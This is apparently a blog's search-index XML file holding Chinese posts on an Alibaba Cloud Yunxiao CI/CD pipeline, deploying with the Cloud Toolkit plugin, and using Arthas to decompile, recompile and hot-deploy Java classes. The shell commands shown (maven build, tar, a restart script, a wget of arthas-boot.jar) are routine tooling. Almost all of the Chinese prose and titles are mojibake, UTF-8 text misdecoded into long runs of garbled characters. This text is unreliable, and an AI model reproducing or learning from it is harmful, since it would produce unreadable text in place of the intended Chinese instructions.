<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>é˜¿é‡Œäº‘-äº‘æ•ˆæµæ°´çº¿å®è·µCI/CD</title>
    <url>/2020/03/14/ali-java-flow/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>CI/CDå¦‚ä½•å®è·µï¼Ÿå¯ä»¥é€šè¿‡å¾ˆå¤šæ–¹å¼ï¼Œä¸€èˆ¬å…¬å¸ä¼šè‡ªå·±ä½¿ç”¨jenkinsæ­å»ºè‡ªå·±çš„æµæ°´çº¿æ¥å®Œæˆã€‚ä¸è¿‡ä¹Ÿæœ‰å¾ˆå¤šäº‘ä¸Šæ–¹æ¡ˆï¼Œæˆ‘ä»¬ä»Šå¤©æ¥çœ‹çœ‹é˜¿é‡Œäº‘æ•ˆçš„æµæ°´çº¿å¦‚ä½•å®è·µã€‚</p>
<h4 id="é…ç½®æ­¥éª¤"><a href="#é…ç½®æ­¥éª¤" class="headerlink" title="é…ç½®æ­¥éª¤"></a>é…ç½®æ­¥éª¤</h4><h5 id="æ–°å»ºæµæ°´çº¿"><a href="#æ–°å»ºæµæ°´çº¿" class="headerlink" title="æ–°å»ºæµæ°´çº¿"></a>æ–°å»ºæµæ°´çº¿</h5><p>é¦–å…ˆç™»å½•äº‘æ•ˆåå°(<a href="https://devops.console.aliyun.com/">ç‚¹å‡»æ­¤é“¾æ¥è¿›å…¥äº‘æ•ˆæ§åˆ¶å°</a>)ï¼ŒæŒ‰ç…§æµç¨‹æ–°å»ºä¸€ä¸ªä¼ä¸šï¼Œç„¶åè¿›å…¥ä¼ä¸šé€‰æ‹©æµæ°´çº¿æ¨¡å—ï¼Œç‚¹å‡»æ–°å»ºæµæ°´çº¿ï¼Œé€‰æ‹©ä¸€ä¸ªæµæ°´çº¿æ¨¡ç‰ˆï¼Œæœ¬æ–‡æ¼”ç¤ºä½¿ç”¨çš„æ˜¯javaå·¥ç¨‹ï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©çš„æ˜¯javaæ¨¡ç‰ˆ &gt;&gt; â€œæµ‹è¯•ã€æ„å»ºã€éƒ¨ç½²åˆ°é˜¿é‡Œäº‘ESC/è‡ªæœ‰ä¸»æœºâ€ã€‚</p>
<p><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/ci/ci-1.png" alt="æµæ°´çº¿æ¨¡ç‰ˆé€‰æ‹©"></p>
<p>é€‰å¥½æ¨¡ç‰ˆä¹‹åï¼Œä¼šç›´æ¥è·³è½¬åˆ°æµç¨‹é…ç½®çš„ç•Œé¢ï¼Œé’ˆå¯¹æ¨¡ç‰ˆè¿›è¡Œç›¸åº”çš„è®¾ç½®ã€‚</p>
<h5 id="æµç¨‹é…ç½®"><a href="#æµç¨‹é…ç½®" class="headerlink" title="æµç¨‹é…ç½®"></a>æµç¨‹é…ç½®</h5><h6 id="æ·»åŠ ä»£ç æº"><a href="#æ·»åŠ ä»£ç æº" class="headerlink" title="æ·»åŠ ä»£ç æº"></a>æ·»åŠ ä»£ç æº</h6><p>å› ä¸ºæ˜¯githubæ‰˜ç®¡ï¼Œæ‰€ä»¥è¦å…ˆè¿›è¡Œgithubè´¦å·æˆæƒï¼Œæ‰èƒ½æ‹‰å–åˆ°githubä»“åº“çš„ä»£ç ï¼Œæˆ‘ä»¬ç›´æ¥ç‚¹å‡»githubå›¾æ ‡ï¼Œè¿›è¡Œç›¸åº”æˆæƒå³å¯ã€‚<br>å¦‚æœä½ æ˜¯è‡ªå·±æ­å»ºçš„gitä»“åº“ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©â€œé€šç”¨gitâ€çš„æ–¹å¼ï¼ŒåŒæ ·å¾ˆå®¹æ˜“é…ç½®ã€‚</p>
<p>1ï¼Œåˆ†æ”¯ä¿¡æ¯å¡«å†™ï¼šå¡«å†™ä»£ç ä»“åº“å’Œåˆ†æ”¯ä¿¡æ¯ã€‚</p>
<p>2ï¼Œå¼€å¯ä»£ç æºè§¦å‘ï¼Œè¿™æ ·åç»­åªéœ€è¦pushä»£ç å³å¯å®Œæˆæµæ°´çº¿çš„è‡ªåŠ¨æ„å»ºå‘å¸ƒ</p>
<ul>
<li>é’©ä¸Šâ€œä»£ç æäº¤â€ï¼Œå°†WebHookåœ°å€å¤åˆ¶å‡ºæ¥å¤‡ç”¨ï¼Œåˆ†æ”¯å¡«â€œmasterâ€ã€‚</li>
</ul>
<p>3ï¼Œåˆ° Githubä»£ç åº“é…ç½®WebHookï¼Œè·¯å¾„ï¼šä»£ç åº“ &gt;&gt; Settings &gt;&gt; Webhooks</p>
<ul>
<li>ç‚¹å‡» Add Webhook</li>
<li>å°† ä¸Šä¸€æ­¥å¤åˆ¶çš„  WebHook åœ°å€ï¼Œå¡«å…¥ Payload URL</li>
<li>å°† Content Type é€‰æ‹©ä¸º â€œapplication/jsonâ€</li>
<li>é€‰æ‹© Just the push event</li>
</ul>
<p>æœ€åç¡®è®¤æ·»åŠ å³å¯ï¼</p>
<p>ç¼–è¾‘é¡µé¢å›¾ä¾‹ï¼š<br><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/ci/ci-2.png" alt="æ·»åŠ ä»£ç æº"></p>
<h6 id="é…ç½®ä»£ç æ£€æŸ¥å’Œæµ‹è¯•"><a href="#é…ç½®ä»£ç æ£€æŸ¥å’Œæµ‹è¯•" class="headerlink" title="é…ç½®ä»£ç æ£€æŸ¥å’Œæµ‹è¯•"></a>é…ç½®ä»£ç æ£€æŸ¥å’Œæµ‹è¯•</h6><p>è¿™ä¸ªç¯èŠ‚ï¼Œæ²¡æœ‰ä»€ä¹ˆå¥½é…ç½®çš„ï¼Œå·²ç»å¸®ä½ é»˜è®¤é€‰æ‹©äº†javaä»£ç è§„çº¦æ£€æŸ¥ã€‚ä½ ä¹Ÿå¯ä»¥æ·»åŠ å…¶ä»–ä»»åŠ¡æ­¥éª¤ï¼Œå¦‚åˆ†æ”¯æ£€æŸ¥ã€ä»£ç è¦†ç›–ç‡ç­‰ä»»åŠ¡æ­¥éª¤ã€‚</p>
<h6 id="æ„å»ºé…ç½®"><a href="#æ„å»ºé…ç½®" class="headerlink" title="æ„å»ºé…ç½®"></a>æ„å»ºé…ç½®</h6><p>1ï¼Œä»»åŠ¡ä¿¡æ¯ï¼šä»»åŠ¡åç§°å¡«å†™ã€æ„å»ºé›†ç¾¤é€‰æ‹©</p>
<p>2ï¼Œjavaæ„å»ºé…ç½®</p>
<ul>
<li>é€‰æ‹©jdkç‰ˆæœ¬ï¼Œæˆ‘é€‰æ‹©çš„jdk1.8</li>
<li>ç¼–è¾‘æ„å»ºå‘½ä»¤ï¼Œè¿™ä¸ªä¸€èˆ¬é»˜è®¤çš„å°±å¥½ï¼Œå¦‚ä¸‹ï¼š<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mvn -B clean package -Dmaven.test.skip=<span class="literal">true</span> -Dautoconfig.skip</span><br></pre></td></tr></table></figure>
3ï¼Œæ„å»ºç‰©ä¸Šä¼ é…ç½®</li>
<li>åˆ¶å“åç§°å¡«å†™ï¼Œè¿™ä¸ªå¾ˆå…³é”®ï¼Œæ˜¯æˆ‘ä»¬æœ€åæ„å»ºå‡ºæ¥çš„jaråŒ…çš„åç§°</li>
<li>æ‰“åŒ…è·¯å¾„å¡«å†™ï¼ŒåŒæ ·å¾ˆå…³é”®ï¼Œæˆ‘è¿™ä¸ªå·¥ç¨‹çš„targetæ”¾åœ¨applicationé‡Œçš„ï¼Œæ‰€ä»¥æˆ‘çš„åœ°å€ä¸ºï¼šapplication/target/</li>
</ul>
<h6 id="ä¸»æœºéƒ¨ç½²é…ç½®"><a href="#ä¸»æœºéƒ¨ç½²é…ç½®" class="headerlink" title="ä¸»æœºéƒ¨ç½²é…ç½®"></a>ä¸»æœºéƒ¨ç½²é…ç½®</h6><p>1ï¼Œå¡«å†™å¥½ä»»åŠ¡åç§°ï¼Œé’©ä¸Šâ€œéƒ¨ç½²æ—¶ä¸‹è½½åˆ¶å“â€ï¼Œå¹¶åœ¨åˆ¶å“è¾“å…¥é¡¹é€‰ä¸­æˆ‘ä»¬ä¸Šé¢é…ç½®çš„åˆ¶å“</p>
<p>2ï¼Œæ·»åŠ ä¸»æœºï¼Œæˆ‘è¿™é‡Œé€‰ä¸­çš„æ˜¯â€œè‡ªæœ‰ä¸»æœºâ€ï¼Œå…¶å®ä¹Ÿæ˜¯é˜¿é‡Œäº‘çš„ï¼Œåªä¸è¿‡åœ¨å¦ä¸€ä¸ªè´¦å·ä¸‹è€Œå·²ï¼Œå®ƒè¿™é‡Œçš„é˜¿é‡Œäº‘ecsæ–¹å¼æ·»åŠ åªèƒ½æ·»åŠ æœ¬è´¦å·ä¸‹çš„ï¼Œæ‰€ä»¥è¿«ä¸å¾—å·²[ç¬‘å“­]ã€‚<br>è¿™ä¸ªæ·»åŠ æ–¹å¼æˆ‘è§‰å¾—ä¹Ÿåšçš„å¾ˆäº²æ°‘ï¼Œåªéœ€è¦å°†å®ƒç”Ÿæˆçš„ä¸€ä¸²å‘½ä»¤copyåˆ°è‡ªå·±çš„ä¸»æœºä¸Šæ‰§è¡Œä¸‹å³å¯ã€‚<br><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/ci/ci-3.png" alt="æ·»åŠ ä¸»æœº"></p>
<p>3ï¼Œéƒ¨ç½²é…ç½®</p>
<ul>
<li>ä¸‹è½½è·¯å¾„ï¼š/home/admin/app/package.tgz</li>
<li>æ‰§è¡Œç”¨æˆ·ï¼šroot</li>
<li>éƒ¨ç½²è„šæœ¬ï¼šæˆ‘å•ç‹¬å†™äº†ä¸€ä¸ªå¯åŠ¨è„šæœ¬æ”¾åœ¨äº†æœåŠ¡å™¨ä¸Šï¼Œæ‰€ä»¥ç›´æ¥æ‰§è¡Œè§£å‹æ–‡ä»¶æ‰§è¡Œè„šæœ¬å³å¯ï¼Œå‘½ä»¤å¦‚ï¼š<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -zxvf /home/admin/app/package.tgz -C /home/pro-mall/</span><br><span class="line">sh /root/c.sh restart</span><br></pre></td></tr></table></figure>
4ï¼Œä»»åŠ¡æ’ä»¶é…ç½®</li>
</ul>
<p>ä»»åŠ¡æ’ä»¶æœ‰é’‰é’‰æœºå™¨äººã€é‚®ä»¶å’Œwebhooké€šçŸ¥ä¸‰ç§æ–¹å¼ï¼Œ æˆ‘é€‰æ‹©çš„æ˜¯é’‰é’‰é€šçŸ¥ï¼Œæ¯•ç«Ÿç»å¸¸ä½¿ç”¨ï¼Œæ‰€ä»¥pushè§¦è¾¾ç‡é«˜ã€‚</p>
<p>å› ä¸ºæ˜¯å†™æ–‡ç« æµ‹è¯•ä¸€ä¸‹ï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œæ‰€ä»¥æˆ‘ç›´æ¥åœ¨é’‰é’‰æ–°å»ºäº†ä¸€ä¸ªä¸€äººä¹Ÿèƒ½ç”¨çš„åœºæ™¯ç¾¤ï¼Œæ­¥éª¤ï¼š</p>
<ul>
<li>è¿›å…¥åœºæ™¯ç¾¤ï¼Œç‚¹å‡»ç¾¤èŠå³ä¾§çš„æ™ºèƒ½ç¾¤åŠ©æ‰‹</li>
<li>é€‰æ‹©æ·»åŠ æœºå™¨äººï¼Œâ€œè‡ªå®šä¹‰-é€šè¿‡webhookæ¥å…¥è‡ªå®šä¹‰æœåŠ¡â€ æœºå™¨äºº</li>
<li>å¡«å†™æœºå™¨äººåå­—ï¼Œæˆ‘ç›´æ¥å†™æˆäº†ï¼šâ€œCIæœºå™¨äººâ€</li>
<li>é€‰æ‹©å®‰å…¨è®¾ç½®ï¼Œæˆ‘ä½¿ç”¨çš„è‡ªå®šä¹‰å…³é”®è¯ï¼Œç„¶åå¡«å†™äº†ï¼šâ€œpro-mallâ€</li>
<li>æœ€åï¼Œé’©ä¸Šåè®®ï¼Œç‚¹å‡»ç¡®è®¤ï¼Œå°†Webhookçš„urlæ‹·è´å‡ºæ¥ï¼Œå¡«å†™åˆ°æµæ°´çº¿çš„webhookåœ°å€ä¸Šå³å¯</li>
</ul>
<p>æ•ˆæœå›¾ä¾‹ï¼š<br><image src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/ci/ci-7.jpeg" width=250></p>
<h5 id="åŸºæœ¬ä¿¡æ¯é…ç½®"><a href="#åŸºæœ¬ä¿¡æ¯é…ç½®" class="headerlink" title="åŸºæœ¬ä¿¡æ¯é…ç½®"></a>åŸºæœ¬ä¿¡æ¯é…ç½®</h5><p>åŸºæœ¬ä¿¡æ¯ï¼šæµæ°´çº¿åç§°ã€ç¯å¢ƒã€ä»¥åŠæ ‡ç­¾ä¿¡æ¯å¡«å†™</p>
<p>æˆå‘˜ä¿¡æ¯ï¼šæ·»åŠ æµæ°´çº¿çš„æˆå‘˜ï¼Œå·²ç»é»˜è®¤æ·»åŠ äº†å½“å‰ç”¨æˆ·</p>
<h5 id="è§¦å‘è®¾ç½®"><a href="#è§¦å‘è®¾ç½®" class="headerlink" title="è§¦å‘è®¾ç½®"></a>è§¦å‘è®¾ç½®</h5><p>è¿™é‡Œçš„è®¾ç½®æœ‰Webhookè§¦å‘å’Œå®šæ—¶è§¦å‘ä¸¤ç§é€‰æ‹©ï¼Œæœ¬æ–‡é€‰æ‹©Webhookæ–¹å¼ã€‚</p>
<p>1ï¼Œå¼€å¯ä»£ç Webhookè§¦å‘ï¼Œå°†WebHookåœ°å€å¤åˆ¶å‡ºæ¥ã€‚</p>
<p>2ï¼Œåˆ° Githubä»£ç åº“é…ç½®WebHook</p>
<p>ä»£ç åº“ &gt;&gt; Settings &gt;&gt; Webhooksï¼Œç‚¹å‡» Add Webhook<br>å°† Flow æµæ°´çº¿ä¸Šå¤åˆ¶çš„  WebHook åœ°å€ï¼Œå¡«å…¥ Payload URL<br>å°† Content Type é€‰æ‹©ä¸º â€œapplication/jsonâ€<br>é€‰æ‹© Just the push event<br>ç¡®è®¤æ·»åŠ </p>
<h4 id="ä»»åŠ¡è§¦å‘"><a href="#ä»»åŠ¡è§¦å‘" class="headerlink" title="ä»»åŠ¡è§¦å‘"></a>ä»»åŠ¡è§¦å‘</h4><p>1ï¼Œç›´æ¥åœ¨äº‘æ•ˆæµæ°´çº¿åå°ï¼Œç‚¹å‡»è¿è¡Œæ‰‹åŠ¨è§¦å‘</p>
<p>2ï¼Œä¿®æ”¹ä»£ç ï¼Œpushåˆ°githubï¼Œé€šè¿‡webhookå®Œæˆè§¦å‘</p>
<p>è¿è¡Œå›¾ä¾‹:<br><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/ci/ci-5.png" alt="æ·»åŠ ä¸»æœº"></p>
]]></content>
      <categories>
        <category>ci/cd</category>
      </categories>
      <tags>
        <tag>ci/cd</tag>
        <tag>æŒç»­é›†æˆ</tag>
        <tag>æŒç»­äº¤ä»˜</tag>
        <tag>æŒç»­éƒ¨ç½²</tag>
        <tag>æµæ°´çº¿</tag>
      </tags>
  </entry>
  <entry>
    <title>arthas-é€šè¿‡cloud toolkitæ’ä»¶å®ç°å¿«é€Ÿéƒ¨ç½²å’Œè¿œç¨‹è¯Šæ–­</title>
    <url>/2020/06/19/arthas-cloud-toolkit/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;Cloud Toolkitæ˜¯é›†å¼€å‘ã€æµ‹è¯•ã€è¯Šæ–­ã€éƒ¨ç½²ä¸ºä¸€ä½“çš„å…è´¹IDEæ’ä»¶ï¼Œèƒ½å¸®åŠ©å¼€å‘è€…å®ç°ä¸€é”®å¼éƒ¨ç½²å’Œä»£ç è¯Šæ–­ï¼Œæ˜¯æå‡æ•ˆç‡å’Œé™ä½å¼€å‘æˆæœ¬çš„åˆ©å¥½æ’ä»¶ã€‚</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;æ­¤æ’ä»¶è¿˜æ•´åˆäº†å…¶ä»–å¥½ç”¨çš„åŠŸèƒ½ï¼Œå¦‚dockeræ‰“åŒ…ç­‰ï¼Œä¸è¿‡å¹¶ä¸æ˜¯æˆ‘ä»¬ä»Šå¤©çš„ä¸»é¢˜ï¼Œæœ¬æ–‡ä¸»è¦è®²çš„æ˜¯ å¦‚ä½•é€šè¿‡å®ƒå¿«é€Ÿéƒ¨ç½²åº”ç”¨ï¼Œä»¥åŠä½¿ç”¨arthaså¯¹ç›®æ ‡æœåŠ¡å™¨ä¸Šçš„javaåº”ç”¨è¿›è¡Œè¯Šæ–­ã€‚</p>
<h4 id="æ’ä»¶å®‰è£…ä»¥åŠSSHé…ç½®"><a href="#æ’ä»¶å®‰è£…ä»¥åŠSSHé…ç½®" class="headerlink" title="æ’ä»¶å®‰è£…ä»¥åŠSSHé…ç½®"></a>æ’ä»¶å®‰è£…ä»¥åŠSSHé…ç½®</h4><p>1ï¼Œå®‰è£…æ’ä»¶</p>
<p>æ’ä»¶å®‰è£…å¾ˆå®¹æ˜“ï¼Œç›´æ¥åœ¨æ’ä»¶å¸‚åœºé‡Œå³å¯æ‰¾åˆ°å®‰è£…ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„IDEæ˜¯intelliJ IDEAï¼Œæ’ä»¶å®‰è£…è·¯å¾„ï¼šPreferences &gt;&gt; Plugins &gt;&gt; æœç´¢ï¼š Alibaba Cloud Toolkit</p>
<p>2ï¼Œé…ç½®SSHæœåŠ¡å™¨</p>
<p>æ’ä»¶å®‰è£…åï¼Œæˆ‘ä»¬å¯ä»¥åœ¨IDEçš„åº•éƒ¨å·¥å…·æ çœ‹åˆ°é€‰é¡¹å¡ï¼šâ€œAlibaba Cloud Viewâ€ï¼Œç›´æ¥æ‰“å¼€å®ƒï¼Œç„¶åé€‰æ‹©ï¼šâ€œHostâ€ï¼Œæ·»åŠ æˆ‘ä»¬çš„æœºå™¨å³å¯ã€‚</p>
<h4 id="å¿«é€Ÿéƒ¨ç½²javaåº”ç”¨"><a href="#å¿«é€Ÿéƒ¨ç½²javaåº”ç”¨" class="headerlink" title="å¿«é€Ÿéƒ¨ç½²javaåº”ç”¨"></a>å¿«é€Ÿéƒ¨ç½²javaåº”ç”¨</h4><p>ä¹‹å‰ï¼Œä¸ºäº†è®©æˆ‘çš„ç¨‹åºèµ° CI/CD å‘å¸ƒæµç¨‹ï¼Œæˆ‘é€‰æ‹©äº†é˜¿é‡Œäº‘çš„äº‘æ•ˆæµæ°´çº¿ï¼ŒåŠŸèƒ½å¾ˆå¥½ç”¨ï¼Œé…ç½®ä¹Ÿç®€å•ï¼Œè¯¦æƒ…å¯è§ï¼š<a href="https://32e.co/2020/03/14/ali-java-flow/">é˜¿é‡Œäº‘-äº‘æ•ˆæµæ°´çº¿å®è·µCI/CD</a>ã€‚</p>
<p>ä¸è¿‡ï¼Œå½“æˆ‘ä½“éªŒäº†è¿™ä¸ªæ’ä»¶ä¹‹åï¼Œæˆ‘å°±æš‚æ—¶åœæ­¢äº†æµæ°´çº¿çš„è§¦å‘å¼€å…³ï¼Œæ”¹ç”¨è¿™ä¸ªæ’ä»¶æ¥å‘å¸ƒäº†ï¼Œå› ä¸ºæ˜¯è‡ªå·±çš„å°é¡¹ç›®ï¼Œæ‰€ä»¥è¿™æ ·å‘å¸ƒï¼Œæ›´åŠ çµæ´»å¯æ§ã€‚</p>
<p>ç°åœ¨ï¼Œæˆ‘ä»¬å°±æ¥çœ‹çœ‹ï¼Œå¦‚ä½•é€šè¿‡å®ƒå¿«é€Ÿçš„éƒ¨ç½²æˆ‘ä»¬javaåº”ç”¨å§ï¼š</p>
<p>1ï¼Œé€‰æ‹©éƒ¨ç½²æ–¹å¼ï¼Œé€‰ä¸­é¡¹ç›®ï¼Œå³é”®å‘¼å‡ºèœå•ï¼Œç„¶åé€‰æ‹©ï¼šAlibaba Cloud &gt;&gt; Deploy to Host</p>
<p>ç¤ºä¾‹ï¼š<br><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/arthas/deploy01-1.png" alt="é€‰æ‹©éƒ¨ç½²æ–¹å¼"></p>
<p>2ï¼Œé…ç½®æ‰“åŒ…å‚æ•°ï¼š</p>
<ul>
<li>é€‰æ‹©Upload Fileæ–¹å¼ï¼Œå¹¶é€‰æ‹©æ‰“åŒ…ç”Ÿæˆçš„jarçš„moduleç›®å½•</li>
<li>é…ç½®mavenæ‰“åŒ…å‘½ä»¤ï¼Œé€šå¸¸å°†maven goalè®¾ç½®ä¸ºï¼šclean install</li>
<li>æ·»åŠ ç›®æ ‡æœåŠ¡å™¨ï¼Œç‚¹å‡»å³è¾¹ğŸ‘‰çš„åŠ å·å¯ä»¥é€‰æ‹©ä¹‹å‰æ·»åŠ çš„æœºå™¨</li>
<li>è®¾ç½®ä¸Šä¼ æ–‡ä»¶çš„ç›®æ ‡ç›®å½•ï¼Œå³ä¸Šä¼ åçš„jarä¿å­˜ç›®å½•</li>
<li>è®¾ç½®é¡¹ç›®çš„å¯åŠ¨è„šæœ¬å‘½ä»¤ï¼Œè„šæœ¬éœ€è¦æå‰æ”¾åˆ°æœåŠ¡å™¨ä¸Šï¼Œå…·ä½“å‘½ä»¤å¦‚ä½•ç¼–å†™å¯å‚è€ƒæ–‡ç« ï¼š<a href="https://32e.co/2019/05/01/shell-java-jar-manage/">java jarç»´æŠ¤è„šæœ¬</a></li>
</ul>
<p>ç¤ºä¾‹ï¼š<br><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/arthas/deploy02.png" alt="é…ç½®æ‰“åŒ…å‚æ•°"></p>
<p>3ï¼Œéƒ¨ç½²æµ‹è¯•ï¼Œé…ç½®å®Œæˆåï¼Œç›´æ¥è¿è¡Œå³å¯ï¼Œæ’ä»¶ä¼šè‡ªåŠ¨æ‰“åŒ…å¹¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œè‡ªåŠ¨æ‰§è¡Œå¯åŠ¨å‘½ä»¤å®Œæˆéƒ¨ç½²ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/arthas/deploy03.png"></p>
<h4 id="ä½¿ç”¨arthasåŠŸèƒ½è¯Šæ–­"><a href="#ä½¿ç”¨arthasåŠŸèƒ½è¯Šæ–­" class="headerlink" title="ä½¿ç”¨arthasåŠŸèƒ½è¯Šæ–­"></a>ä½¿ç”¨arthasåŠŸèƒ½è¯Šæ–­</h4><p>1ï¼Œæ‰“å¼€cloud toolkitèœå•ï¼Œåœ¨â€œhostâ€é‡Œï¼Œæ‰¾åˆ°åˆšæ‰æ·»åŠ çš„æœºå™¨ï¼Œç„¶åç‚¹å‡»ï¼šMore &gt;&gt; Diagnosticï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/arthas/kit01.png"></p>
<p>2ï¼Œé€‰æ‹©Diagnosticåï¼Œæ’ä»¶ä¼šé€šè¿‡sshè¿æ¥åˆ°ç›®æ ‡æœºå™¨ä¸Šï¼Œå¹¶è‡ªåŠ¨ä¸‹è½½arthasï¼Œä»¥åŠè‡ªåŠ¨è¿è¡Œjava -jar arthas-boot.jarå¯åŠ¨è¯Šæ–­ç¨‹åºï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/arthas/kit02.png"></p>
<p>3ï¼Œç„¶åï¼Œæˆ‘ä»¬åªéœ€è¦é€‰æ‹©æ‰¾ç½—åˆ—çš„javaè¿›ç¨‹çš„IDï¼Œå³å¯è¿›å…¥arthasé¢æ¿ï¼Œå¼€å§‹æˆ‘ä»¬çš„è¯Šæ–­ä¹‹æ—…äº†ã€‚æ’ä»¶çš„è¿™ä¸ªåŠŸèƒ½èƒ½ è‡ªåŠ¨è¿æ¥æœºå™¨ã€ä¸‹è½½ã€å¹¶å¯åŠ¨è¯Šæ–­ç¨‹åºï¼Œå¯ä»¥ç»™æˆ‘ä»¬èŠ‚çœå¾ˆå¤šæ—¶é—´ï¼Œä½œä¸ºæ‡’äººï¼Œæˆ‘è¡¨ç¤ºè¿™å¾ˆç¬¦åˆæˆ‘çš„å£å‘³ï¼</p>
]]></content>
      <categories>
        <category>ci/cd</category>
        <category>arthas</category>
      </categories>
      <tags>
        <tag>ci/cd</tag>
        <tag>toolkit</tag>
        <tag>è¿œç¨‹è¯Šæ–­</tag>
        <tag>arthas</tag>
      </tags>
  </entry>
  <entry>
    <title>arthas-ç¼–è¯‘å’Œåç¼–è¯‘Javaç±»</title>
    <url>/2020/06/17/arthas-compile-decompile/</url>
    <content><![CDATA[<h4 id="å‘½ä»¤æ¼”ç¤º"><a href="#å‘½ä»¤æ¼”ç¤º" class="headerlink" title="å‘½ä»¤æ¼”ç¤º"></a>å‘½ä»¤æ¼”ç¤º</h4><p>1ï¼Œä½¿ç”¨jadå‘½ä»¤å¯ä»¥å°†classå­—èŠ‚ç æ–‡ä»¶åç¼–è¯‘ä¸ºjavaç±»</p>
<p>å‘½ä»¤ï¼šjad â€“source-only ç±»reference &gt; javaç±»è·¯å¾„</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jad --source-only com.test.service.impl.UserServiceImpl &gt; /tmp/arthas/UserServiceImpl.java</span><br></pre></td></tr></table></figure>

<p>2ï¼Œç¼–è¯‘javaç±»ï¼Œç”Ÿæˆclasså­—èŠ‚ç æ–‡ä»¶</p>
<p>å‘½ä»¤ï¼šmc -d /ç”Ÿæˆçš„classæ–‡ä»¶ä¿å­˜ç›®å½• éœ€è¦ç”Ÿæˆclassæ–‡ä»¶çš„javaåŸæ–‡ä»¶åœ°å€</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mc -d /tmp/arthas /tmp/arthas/UserServiceImpl.java</span><br></pre></td></tr></table></figure>
<p>æ³¨ï¼šå¯ä»¥ç»“åˆscå’Œredefineå¿«é€Ÿçš„å®ç°çƒ­æ›´</p>
]]></content>
      <categories>
        <category>arthas</category>
      </categories>
      <tags>
        <tag>arthas</tag>
        <tag>åç¼–è¯‘</tag>
        <tag>jad</tag>
      </tags>
  </entry>
  <entry>
    <title>arthas-å®ç°çƒ­éƒ¨ç½²</title>
    <url>/2020/06/17/arthas-hot-deployment/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>&nbsp;&nbsp;æ­£å¸¸æƒ…å†µä¸‹ï¼Œå¦‚æœéœ€è¦åœ¨è¿è¡Œçš„ç¨‹åºä¸­å¢åŠ æ—¥å¿—ã€æˆ–è€…ä¿®æ”¹éƒ¨åˆ†é€»è¾‘ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦æäº¤ä»£ç ï¼Œé‡æ–°éƒ¨ç½²åæ‰èƒ½ç”Ÿæ•ˆï¼Œè¿™æ ·åšï¼Œä¼šç»™æˆ‘ä»¬å¢åŠ å¾ˆå¤šä¸å¿…è¦çš„æ—¶é—´æˆæœ¬ã€‚æ‰€ä»¥ï¼Œæ”¯æŒçƒ­éƒ¨ç½²çš„é‡è¦æ€§å°±æ˜¾è€Œæ˜“è§äº†ã€‚</p>
<p>&nbsp;&nbsp;arthasæ˜¯é˜¿é‡Œå‡ºå“çš„ä»£ç è¯Šæ–­å·¥å…·ï¼Œèƒ½æœ‰æ•ˆçš„ååŠ©æˆ‘ä»¬è¿›è¡Œé—®é¢˜çš„å®šä½å’Œå¤„ç†ã€‚æœ¬æ–‡ï¼Œæˆ‘ä»¬ä¸»è¦è®²çš„æ˜¯ å¦‚ä½•åˆ©ç”¨arthasæ¥å®ç°ä»£ç çƒ­éƒ¨ç½²ï¼Œåˆ©ç”¨arthas-boot.jaråŒ…æˆ–è€…ä½¿ç”¨arthas ideaæ’ä»¶éƒ½èƒ½å®ç°ã€‚</p>
<p>&nbsp;&nbsp;æ³¨ï¼šçƒ­éƒ¨ç½²ä¹Ÿç®—æ˜¯éªšæ“ä½œäº†ï¼Œæœ‰é£é™©ï¼Œä¸å»ºè®®åœ¨ç”Ÿäº§ç¯å¢ƒä¸Šæ“ä½œã€‚</p>
<h4 id="æ–¹å¼ä¸€ï¼šarthas-boot-jar"><a href="#æ–¹å¼ä¸€ï¼šarthas-boot-jar" class="headerlink" title="æ–¹å¼ä¸€ï¼šarthas-boot.jar"></a>æ–¹å¼ä¸€ï¼šarthas-boot.jar</h4><h5 id="è¿è¡Œarthasç¨‹åº"><a href="#è¿è¡Œarthasç¨‹åº" class="headerlink" title="è¿è¡Œarthasç¨‹åº"></a>è¿è¡Œarthasç¨‹åº</h5><p>ä¸‹è½½arthas jaråŒ…ï¼Œå¹¶å¯åŠ¨ï¼Œç„¶åæ‰¾åˆ°å¯¹åº”çš„javaè¿›ç¨‹ï¼Œè¾“å…¥ç¼–å·è¿›å…¥æ§åˆ¶å°</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://alibaba.github.io/arthas/arthas-boot.jar</span><br><span class="line">java -jar arthas-boot.jar</span><br></pre></td></tr></table></figure>

